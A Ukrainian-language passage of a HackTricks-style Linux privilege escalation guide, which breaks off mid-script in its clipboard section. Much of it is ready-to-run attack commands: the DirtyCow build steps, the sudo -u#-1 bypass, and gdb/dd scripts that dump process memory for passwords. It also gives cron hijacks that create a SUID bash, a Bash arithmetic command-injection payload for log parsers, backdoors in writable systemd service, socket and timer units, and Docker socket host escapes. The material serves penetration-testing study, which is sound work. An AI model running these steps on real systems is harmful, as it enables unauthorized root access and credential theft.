# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Інформація про систему

### Інформація про OS

Почнемо збирати інформацію про запущену ОС.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Шлях

Якщо ви **маєте права запису в будь-яку папку всередині змінної `PATH`**, ви можете перехопити деякі бібліотеки або бінарні файли:
```bash
echo $PATH
```
### Інформація про Env

Чи є цікава інформація, паролі або API-ключі у змінних оточення?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію kernel та наявність exploit, який можна використати для escalate privileges.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Ви можете знайти хороший список вразливих ядер і деякі вже **compiled exploits** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) та [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де можна знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі версії вразливих ядер з цього сайту, ви можете зробити:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, що можуть допомогти знайти kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Завжди **search the kernel version in Google**, можливо ваша kernel version згадується в якомусь kernel exploit і тоді ви будете впевнені, що цей exploit дійсний.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Версія sudo

На підставі вразливих версій sudo, які вказані в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи вразлива версія sudo, використавши цей grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: перевірка підпису не пройшла

Перегляньте **smasher2 box of HTB** як **приклад** того, як цю vuln можна експлуатувати.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Додаткова системна енумерація
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічити можливі засоби захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Якщо ви всередині docker container, ви можете спробувати втекти з нього:


{{#ref}}
docker-security/
{{#endref}}

## Диски

Перевірте **що змонтовано і що не змонтовано**, де і чому. Якщо щось не змонтовано, ви можете спробувати змонтувати його і перевірити на наявність конфіденційної інформації
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перерахувати корисні бінарні файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи встановлено **якийсь компілятор**. Це корисно, якщо вам потрібно використовувати якийсь kernel exploit, оскільки рекомендується compile it на машині, де ви збираєтеся його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Встановлене вразливе програмне забезпечення

Перевірте **версію встановлених пакетів та сервісів**. Можливо, присутня стара версія Nagios (наприклад), яку можна експлуатувати для ескалації привілеїв…\  
Рекомендується вручну перевірити версії найбільш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є SSH-доступ до машини, ви також можете використати **openVAS** для перевірки застарілого та вразливого програмного забезпечення, встановленого на машині.

> [!NOTE] > _Зверніть увагу, що ці команди виведуть багато інформації, яка в більшості випадків буде марною, тому рекомендується використовувати програми на кшталт OpenVAS або подібні, які перевіряють, чи версія встановленого програмного забезпечення вразлива до відомих exploits_

## Процеси

Перегляньте, які **процеси** виконуються, і перевірте, чи якийсь процес не має **більше привілеїв, ніж повинен** (можливо, tomcat запускається від root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

Ви можете використовувати інструменти на кшталт [**pspy**](https://github.com/DominicBreuker/pspy) для моніторингу процесів. Це може бути дуже корисно для виявлення вразливих процесів, які виконуються часто або коли виконуються певні умови.

### Process memory

Деякі сервіси на сервері зберігають **credentials in clear text inside the memory**.\
Зазвичай вам потрібні **root privileges** для читання пам'яті процесів, що належать іншим користувачам, тому це зазвичай корисніше, коли ви вже root і хочете знайти додаткові credentials.\
Однак пам'ятайте, що **як звичайний user ви можете читати пам'ять процесів, якими володієте**.

> [!WARNING]
> Зауважте, що сьогодні більшість машин **за замовчуванням не дозволяють ptrace**, що означає, що ви не можете дампити інші процеси, які належать непривілейованим користувачам.
>
> Файл _**/proc/sys/kernel/yama/ptrace_scope**_ контролює доступність ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: усі процеси можуть бути відлагоджені, за умови однакового uid. Це класичний спосіб роботи ptrace.
> - **kernel.yama.ptrace_scope = 1**: відлагоджувати можна лише батьківський процес.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Якщо у вас є доступ до пам'яті сервісу FTP (наприклад), ви можете отримати Heap і шукати в ньому credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Скрипт
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу (PID), **maps показує, як пам'ять відображається у віртуальному адресному просторі цього процесу**; також він показує **права доступу для кожного відображеного регіону**. Псевдофайл **mem** **надає доступ до самої пам'яті процесу**. З файлу **maps** ми знаємо, які **області пам'яті доступні для читання** та їхні зсуви. Ми використовуємо цю інформацію, щоб перейти до позицій у файлі **mem** та вивантажити всі області, доступні для читання, у файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до **фізичної** пам'яті системи, а не до віртуальної пам'яті. До віртуального адресного простору ядра можна отримати доступ за допомогою /dev/kmem.\
Зазвичай `/dev/mem` доступний лише для читання користувачу **root** та групі **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для linux

ProcDump — це версія для linux класичного інструменту ProcDump із набору інструментів Sysinternals для Windows. Отримати його можна за [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб зробити дамп пам'яті процесу, ви можете використовувати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну зняти вимоги root і зробити дамп процесу, що належить вам
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам'яті процесу

#### Ручний приклад

Якщо ви виявите, що процес authenticator запущений:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете dump процес (див. попередні розділи, щоб знайти різні способи дампування пам'яті процесу) і шукати облікові дані в пам'яті:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) буде **steal clear text credentials from memory** та з деяких **well known files**. Для коректної роботи потребує привілеїв root.

| Функція                                           | Ім'я процесу         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Пошук за регулярними виразами/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані/Cron завдання

Перевірте, чи якесь заплановане завдання вразливе. Можливо, ви зможете скористатися скриптом, який виконується від імені root (wildcard vuln? чи можна змінити файли, які використовує root? використовувати symlinks? створити конкретні файли в директорії, яку використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Шлях Cron

Наприклад, всередині _/etc/crontab_ ви можете знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права запису у /home/user_)

Якщо в цьому crontab користувач root намагається виконати якусь команду або скрипт без встановлення PATH. Наприклад: _\* \* \* \* root overwrite.sh_\\
Тоді ви можете отримати root shell, використавши:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, який використовує script з wildcard (Wildcard Injection)

Якщо script виконується від root і містить “**\***” у команді, ви можете використати це, щоб спричинити непередбачувані дії (наприклад privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**If the wildcard is preceded of a path like** _**/some/path/\***_ **, він не є вразливим (навіть** _**./\***_ **не є вразливим).**

Прочитайте наступну сторінку для отримання додаткових трюків експлуатації wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash виконує parameter expansion і command substitution перед arithmetic evaluation у ((...)), $((...)) та let. Якщо root cron/parser читає недовірені поля журналу і передає їх в арифметичний контекст, атакуючий може інжектувати command substitution $(...), який виконається під root під час запуску cron.

- Why it works: У Bash розширення відбуваються в такому порядку: parameter/variable expansion, command substitution, arithmetic expansion, потім word splitting і pathname expansion. Отже значення типу `$(/bin/bash -c 'id > /tmp/pwn')0` спочатку підставляється (команда виконується), а залишкове числове `0` використовується для арифметики, тому скрипт продовжує виконання без помилок.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Запишіть керований атакуючим текст у той журнал, який парситься, так щоб поле, що виглядає як число, містило command substitution і завершувалося цифрою. Переконайтесь, що ваша команда не виводить на stdout (або перенаправте вивід), щоб арифметика залишалася валідною.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Якщо ви **can modify a cron script** executed by root, ви дуже просто можете отримати shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо скрипт, що виконується під root, використовує **directory where you have full access**, можливо, буде корисно видалити цю папку і **create a symlink folder to another one**, яка вказуватиме на іншу папку з script під вашим контролем.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Часті cron jobs

Ви можете моніторити процеси, щоб знайти ті, які виконуються кожні 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і підвищити привілеї.

Наприклад, щоб **моніторити кожні 0.1s протягом 1 хвилини**, **відсортувати за найменш виконуваними командами** і видалити команди, які виконувалися найчастіше, ви можете зробити:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (воно відстежуватиме і перераховуватиме кожен процес, що запускається).

### Невидимі cron jobs

Можна створити cronjob, **поставивши символ повернення каретки після коментаря** (без символу нового рядка), і cronjob працюватиме. Приклад (зверніть увагу на символ повернення каретки):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Служби

### _.service_ файли, доступні для запису

Перевірте, чи можете записати будь-який файл `.service`. Якщо можете, ви **можете змінити його** так, щоб він **виконував** ваш **backdoor коли** служба **запускається**, **перезапускається** або **зупиняється** (можливо, доведеться зачекати до перезавантаження машини).\
Наприклад, створіть ваш backdoor всередині файлу .service з **`ExecStart=/tmp/script.sh`**

### Бінарні файли сервісів, доступні для запису

Майте на увазі, що якщо у вас є **права на запис у бінарні файли, які виконуються сервісами**, ви можете змінити їх на backdoors, тож при повторному запуску сервісів backdoors виконуватимуться.

### systemd PATH - Відносні шляхи

Ви можете переглянути PATH, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **записувати** в будь-яку з папок цього шляху, ви можете мати можливість **підвищити привілеї**. Вам потрібно шукати **відносні шляхи, що використовуються в конфігураційних файлах сервісів**, такі як:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **виконуваний файл** з **тим самим ім'ям, що й бінарний файл за відносним шляхом** у теці PATH systemd, в яку ви маєте права запису, і коли сервіс буде запрошено виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor буде виконано** (звичайні користувачі без привілеїв зазвичай не можуть запускати/зупиняти сервіси, проте перевірте, чи можете використати `sudo -l`).

**Дізнайтеся більше про сервіси за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** — це systemd unit-файли, назва яких закінчується на `**.timer**`, які керують файлами або подіями `**.service**`. **Таймери** можна використовувати як альтернативу cron, оскільки вони мають вбудовану підтримку календарних подій часу та монотонних подій часу і можуть виконуватися асинхронно.

Ви можете перерахувати всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Записувані таймери

Якщо ви можете змінити таймер, ви можете змусити його виконати деякі існуючі одиниці systemd.unit (наприклад `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації можна прочитати, що таке Unit:

> Unit, який потрібно активувати, коли цей timer спрацює. Аргумент — це ім'я unit, суфікс якого не є ".timer". Якщо не вказано, це значення за замовчуванням відповідає service з тим же ім'ям, що й timer unit, за винятком суфікса. (See above.) Рекомендовано, щоб ім'я unit, яке активується, і ім'я timer unit мали однакові назви, відмінні лише суфіксом.

Отже, щоб зловживати цим дозволом, вам потрібно:

- Знайти systemd unit (наприклад, `.service`), який **виконує бінарний файл, у який можна записувати**
- Знайти systemd unit, який **виконується за відносним шляхом** і над яким у вас є **права на запис** у **systemd PATH** (щоб підмінити цей виконуваний файл)

**Дізнайтеся більше про таймери за допомогою `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути таймер, потрібні привілеї root та потрібно виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Зверніть увагу, **таймер** **активується**, створивши символічне посилання на нього в `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix Domain Sockets (UDS) забезпечують **зв’язок між процесами** на тій самій або різних машинах у рамках клієнт‑серверної моделі. Вони використовують стандартні Unix дескрипторні файли для міжмашинного обміну й налаштовуються через `.socket` файли.

Сокети можна налаштувати за допомогою `.socket` файлів.

**Детальніше про сокети — у `man systemd.socket`.** У цьому файлі можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці опції відрізняються, але узагальнення використовується, щоб **вказати, де буде прослуховуватися** сокет (шлях файлу AF_UNIX, IPv4/6 і/або номер порту для прослуховування тощо).
- `Accept`: Приймає булевий аргумент. Якщо **true**, для кожного вхідного з'єднання **спавниться service instance** і лише сокет цього з'єднання передається йому. Якщо **false**, усі слухаючі сокети передаються **запущеній service unit**, і створюється лише один service unit для всіх з'єднань. Це значення ігнорується для datagram сокетів і FIFO, де один service unit беззастережно обробляє весь вхідний трафік. **Defaults to false**. З міркувань продуктивності рекомендується писати нові демони так, щоб вони підходили для `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймають одну або кілька командних рядків, які **виконуються перед** або **після** створення та прив’язки прослуховуючих **sockets**/FIFO відповідно. Перший токен командного рядка має бути абсолютним шляхом до файлу, після нього — аргументи процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які **виконуються перед** або **після** закриття та видалення прослуховуючих **sockets**/FIFO відповідно.
- `Service`: Вказує ім'я **service** unit, яке потрібно **активувати** при **вхідному трафіку**. Ця опція дозволена лише для сокетів з `Accept=no`. За замовчуванням використовується service з тим же ім'ям, що й сокет (з відповідною заміною суфікса). У більшості випадків використання цієї опції не є необхідним.

### Записувані .socket файли

Якщо ви знайдете **доступний для запису** `.socket` файл, ви можете **додати** на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor` і backdoor буде виконано перед створенням сокета. Тому, **ймовірно, доведеться дочекатися перезавантаження машини.**\
_Зверніть увагу, що система має використовувати саме цю конфігурацію socket-файлу, інакше backdoor не буде виконано_

### Сокети, доступні для запису

Якщо ви **виявите будь-який сокет, доступний для запису** (_йдеться про Unix Sockets, а не про конфігураційні `.socket` файли_), то **ви зможете спілкуватися** з цим сокетом і, можливо, використати вразливість.

### Перерахування Unix сокетів
```bash
netstat -a -p --unix
```
### Raw-з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Приклад експлуатації:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Зверніть увагу, що можуть бути деякі **sockets listening for HTTP** requests (_я не маю на увазі .socket files, а файли, що виступають як unix sockets_). Ви можете перевірити це за допомогою:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Якщо сокет **відповідає на HTTP** запит, то ви можете **спілкуватися** з ним і, можливо, **використати якусь вразливість**.

### Доступний для запису Docker socket

Docker socket, часто розташований за адресою `/var/run/docker.sock`, є критичним файлом, який потрібно захистити. За замовчуванням він доступний для запису користувачеві `root` та членам групи `docker`. Наявність прав запису до цього сокета може призвести до privilege escalation. Нижче наведено розбір того, як це можна зробити, та альтернативні методи, якщо Docker CLI недоступний.

#### **Privilege Escalation with Docker CLI**

Якщо у вас є права запису до Docker socket, ви можете escalate privileges за допомогою наступних команд:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити контейнер з root-доступом до файлової системи хоста.

#### **Using Docker API Directly**

У випадках, коли Docker CLI недоступний, Docker socket все ще можна маніпулювати за допомогою Docker API та команд `curl`.

1.  **List Docker Images:** Отримайте список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Надішліть запит на створення контейнера, який монтує кореневий каталог хост-системи.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Запустіть щойно створений контейнер:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Використайте `socat` для встановлення з'єднання з контейнером, що дозволяє виконувати команди всередині нього.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після налаштування `socat`-з'єднання ви можете виконувати команди безпосередньо в контейнері з root-доступом до файлової системи хоста.

### Інше

Зауважте, що якщо у вас є права на запис до docker socket, бо ви **знаходитесь у групі `docker`**, у вас є [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перегляньте **більше способів вийти з docker або зловживати ним для підвищення привілеїв** у:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Якщо ви можете використовувати команду **`ctr`**, ознайомтеся зі наступною сторінкою, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Якщо ви можете використовувати команду **`runc`**, ознайомтеся зі наступною сторінкою, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна система міжпроцесної комунікації (IPC), що дозволяє додаткам ефективно взаємодіяти та обмінюватися даними. Розроблена з урахуванням сучасної Linux-системи, вона пропонує надійну основу для різних форм взаємодії між додатками.

Система є універсальною, підтримує базову IPC, що покращує обмін даними між процесами, подібно до enhanced UNIX domain sockets. Крім того, вона допомагає транслювати події або сигнали, сприяючи безшовній інтеграції між компонентами системи. Наприклад, сигнал від Bluetooth-демона про вхідний виклик може змусити музичний плеєр приглушити звук, покращуючи досвід користувача. Додатково, D-Bus підтримує систему віддалених об'єктів, спрощуючи запити сервісів і виклики методів між додатками, оптимізуючи процеси, які раніше були складними.

D-Bus працює за моделлю **allow/deny**, керуючи дозволами повідомлень (виклики методів, відправлення сигналів тощо) на основі сукупного ефекту правил політики, що збігаються. Ці політики визначають взаємодію з шиною, потенційно дозволяючи privilege escalation через експлуатацію цих дозволів.

Наведено приклад такої політики в `/etc/dbus-1/system.d/wpa_supplicant.conf`, який деталізує дозволи для користувача root на володіння, відправлення та отримання повідомлень від `fi.w1.wpa_supplicant1`.

Політики без вказаного користувача або групи застосовуються універсально, тоді як політики з контекстом "default" застосовуються до всіх, хто не покривається іншими конкретними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як enumerate and exploit D-Bus комунікацію тут:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво enumerate мережу й з'ясувати розташування машини.

### Загальна enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Відкриті порти

Завжди перевіряйте мережеві сервіси на машині, з якими ви не могли взаємодіяти до отримання доступу:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Перевірте, чи можете sniff трафік. Якщо так, ви зможете отримати деякі credentials.
```
timeout 1 tcpdump
```
## Користувачі

### Загальне перерахування

Перевірте **хто** ви, які **привілеї** у вас є, які **користувачі** є в системі, хто може **увійти** і хто має **root-права:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Великий UID

Деякі версії Linux були вражені помилкою, яка дозволяє користувачам з **UID > INT_MAX** підвищувати привілеї. Більше інформації: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) та [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи є ви **членом якоїсь групи**, що може надати вам root-привілеї:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи є в буфері обміну щось цікаве (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
